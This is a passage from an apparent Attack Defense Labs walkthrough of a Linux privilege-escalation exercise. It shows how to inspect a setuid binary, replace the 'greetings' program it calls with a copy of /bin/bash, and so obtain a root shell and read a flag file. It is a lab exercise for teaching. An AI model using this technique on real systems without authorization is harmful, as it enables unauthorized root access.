```bash

* Check the contents of the students directory.

```bash

> `welcome` file has the `SUID` permission applied.

```bash
./greetings
	bash: ./greetings: Permission denied
./welcome
	Welcome to Attack Defense Labs
```

* Observe that the welcome binary has suid bit set (or on). This means that this binary and its child processes will run with root privileges. Check the file type

```bash
file welcome
    welcome: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=199bc8fd6e66e29f770cdc90ece1b95484f34fca, not stripped
```

> It is an ELF binary.

* Investigate the binary. The most easy or preliminary way of doing that is to use strings command.
* Observe the greetings strings in the output of the strings command. It is possible that welcome binary is calling greetings binary. So, replace the greetings binary with some other binary (say `/bin/bash`) which should then also get executed as root.

* Delete greetings binary and then copy `/bin/bash` to its location and rename that to greetings.

```bash
rm greetings
cp /bin/bash greetings
```

* Run the `welcome` binary again.

```bash
./welcome
whoami
cd /root/
ls
cat flag
```
